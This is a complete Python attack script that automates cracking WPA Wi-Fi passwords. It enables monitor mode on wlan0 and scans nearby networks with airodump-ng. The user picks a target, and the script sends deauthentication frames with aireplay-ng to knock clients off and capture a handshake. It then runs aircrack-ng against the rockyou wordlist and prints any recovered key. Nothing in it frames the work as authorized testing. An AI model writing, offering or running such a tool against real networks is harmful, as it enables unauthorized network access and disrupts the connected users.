#!/usr/bin/env python3
import subprocess
import os
import time
import re

def check_root():
    if os.geteuid() != 0:
        print("[!] Please run as root")
        exit(1)

def enable_monitor_mode(interface):
    try:
        subprocess.run(["airmon-ng", "check", "kill"], check=True)
        subprocess.run(["ip", "link", "set", interface, "down"], check=True)
        subprocess.run(["iw", interface, "set", "monitor", "control"], check=True)
        subprocess.run(["ip", "link", "set", interface, "up"], check=True)
        subprocess.run(["airmon-ng", "start", interface], check=True)
        return f"{interface}mon"
    except subprocess.CalledProcessError as e:
        print(f"[!] Error enabling monitor mode: {e}")
        exit(1)

def scan_networks(mon_interface):
    try:
        scan = subprocess.Popen(["airodump-ng", mon_interface], stdout=subprocess.PIPE, stderr=subprocess.DEVNULL)
        time.sleep(10)
        scan.terminate()
        stdout, _ = scan.communicate()
        return stdout.decode()
    except Exception as e:
        print(f"[!] Scanning error: {e}")
        exit(1)

def parse_networks(scan_results):
    networks = []
    lines = scan_results.split('\n')
    for line in lines:
        if "BSSID" in line:
            continue
        match = re.search(r'(([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}).*?(\d+)\s+.*?(-?\d+)', line)
        if match:
            networks.append({
                "bssid": match.group(1),
                "channel": match.group(3),
                "power": match.group(4)
            })
    return networks

def capture_handshake(mon_interface, bssid, channel, output_file):
    try:
        cmd = [
            "airodump-ng",
            "--bssid", bssid,
            "--channel", channel,
            "--write", output_file,
            mon_interface
        ]
        airodump = subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        deauth = subprocess.Popen([
            "aireplay-ng",
            "--deauth", "4",
            "-a", bssid,
            mon_interface
        ], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        time.sleep(12)
        airodump.terminate()
        deauth.terminate()
        return True
    except Exception as e:
        print(f"[!] Capture failed: {e}")
        return False

def crack_password(capture_file, wordlist="/usr/share/wordlists/rockyou.txt"):
    try:
        result = subprocess.run([
            "aircrack-ng",
            capture_file + "-01.cap",
            "-w", wordlist
        ], capture_output=True, text=True)
        if "KEY FOUND!" in result.stdout:
            match = re.search(r'KEY FOUND! \[(.*?)\]', result.stdout)
            return match.group(1) if match else None
        return None
    except Exception as e:
        print(f"[!] Cracking failed: {e}")
        return None

def main():
    check_root()
    interface = "wlan0"
    mon_interface = enable_monitor_mode(interface)
    
    print("[*] Scanning networks...")
    scan_results = scan_networks(mon_interface)
    networks = parse_networks(scan_results)
    
    print("[+] Available networks:")
    for idx, net in enumerate(networks):
        print(f"{idx + 1}. BSSID: {net['bssid']} | Channel: {net['channel']} | Power: {net['power']}dB")
    
    target = networks[int(input("[?] Select target number: ")) - 1]
    output_file = "capture"
    
    print(f"[*] Capturing handshake for {target['bssid']}...")
    if capture_handshake(mon_interface, target['bssid'], target['channel'], output_file):
        print("[+] Handshake captured! Starting crack...")
        password = crack_password(output_file)
        if password:
            print(f"[+] Success! Password: {password}")
        else:
            print("[!] Password not found in wordlist")
    else:
        print("[!] Failed to capture handshake")

if __name__ == "__main__":
    main()